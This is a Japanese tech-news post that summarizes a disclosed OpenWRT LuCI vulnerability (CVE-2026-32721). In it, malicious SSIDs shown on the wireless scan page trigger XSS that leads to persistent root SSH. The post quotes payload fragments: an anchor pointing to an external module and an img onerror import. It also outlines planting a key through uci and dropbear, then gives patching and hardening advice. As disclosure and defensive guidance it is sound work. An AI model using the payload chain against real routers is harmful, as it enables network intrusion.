---
layout: post
title: "Root from the parking lot: OpenWRT XSS through SSID scanning (CVE-2026-32721) - 駐車場からのroot奪取：SSIDスキャン経由のOpenWRT XSS（CVE-2026-32721）"
date: 2026-03-20T04:20:51.301Z
categories: [tech, world-news]
tags: [tech-news, japan]
source_url: "https://mxsasha.eu/posts/openwrt-ssid-xss-to-root/"
source_title: "Root from the parking lot: OpenWRT XSS through SSID scanning (CVE-2026-32721)"
source_id: 806485860
excerpt: "*駐車場でSSIDを受信するだけでOpenWRTがroot奪取される重大脆弱性と対策*"
image: "https://mxsasha.eu/posts/openwrt-ssid-xss-to-root/tdeck2.jpg"
---

# Root from the parking lot: OpenWRT XSS through SSID scanning (CVE-2026-32721) - 駐車場からのroot奪取：SSIDスキャン経由のOpenWRT XSS（CVE-2026-32721）
駐車場でSSIDを拾うだけでルーターが乗っ取られる？管理画面のワイヤレススキャンが開くだけでroot奪取まで可能になる実例

## 要約
OpenWRTのLuCI（luci-mod-network）のワイヤレススキャン表示でSSIDがそのままinnerHTMLに埋め込まれ、サニタイズが無いためにSSIDを悪用したXSSが発生。認証済み管理者がスキャンページを開くだけで、最終的にroot SSHを植え付けられる危険がある（CVE-2026-32721、CVSS 8.6）。修正はOpenWrt 24.10.6 / 25.12.1で適用済み。

## この記事を読むべき理由
- 物理的に近づくだけで管理者権限を奪える「ワンウェイ」の攻撃手法は、日本の現場でも現実的（オフィス駐車場や集合住宅の共用スペースなど）。  
- ネットワーク管理者やルーター運用担当は、単なるSSID表示が重大インシデントに直結することを理解しておく必要がある。

## 詳細解説
- 脆弱箇所：luci-mod-network内のwireless.jsがスキャン結果のSSID文字列を検証せずinnerHTMLに挿入。SSIDは最大32バイトで、表示の過程で制御文字などがそのまま通る。  
- 攻撃条件：攻撃者がビーコンフレームで悪意あるSSIDを周辺に飛ばす → 管理者が「Network → Wireless → Scan」を開く（スキャン結果の表示でトリガー）。管理者がSSIDに接続する必要はない。  
- 32バイトの制約を回避する工夫：2つのアクセスポイントで異なるSSIDを同時に飛ばす手法。例として、SSID1でアンカータグ（id=s href=//domain/x.js）を置き、SSID2で<img src=x onerror=import(s)>を用意。両方がDOMに挿入され、import(s)が外部モジュールを読み込み、任意JSが管理画面権限で実行される。  
- 権限昇格：LuCI上で実行されたJSは管理API（/cgi-bin/luci/を経由したubus）を呼び出し、uciでdropbear設定を変更、/etc/dropbear/authorized_keysへ公開鍵を植え、サービス再起動で永続的なroot SSHを確立できる。攻撃は検知しづらく、SSIDが消えた後でもrootアクセスは残る。  
- 検証機材／影響範囲：著者は工場出荷状態のOpenWrt 25.12.0をFRITZ!Repeater 1750Eで再現。汎用のluci-mod-networkをそのまま使うディストリビューション（下流ビルド）も影響の可能性あり。

## 実践ポイント
- まずアップデート：OpenWrtを利用しているなら24.10.6 / 25.12.1以降へ速やかに更新する。ベンダー配布のルーターもファーム更新を確認。  
- 管理インターフェースの露出を最小化：管理WebをWAN側で公開しない、管理画面へのアクセスをIPで制限、HTTPSと強固な管理パスワードを使用。  
- 物理的対策：屋外や共用スペースに設置したデバイスは物理的に保護し、怪しいSSIDが見えたら安易に管理画面を開かない。  
- ロギングと監視：ubus系の異常な設定変更やUnknownの公開鍵追加を監視する。  
- ベンダー確認：GL.iNetやTurrisなどの下流イメージを使う場合は、luci-mod-networkの扱いをベンダーに確認する。

参考：CVE-2026-32721（修正済み）、類似の過去脆弱性CVE-2019-25015。
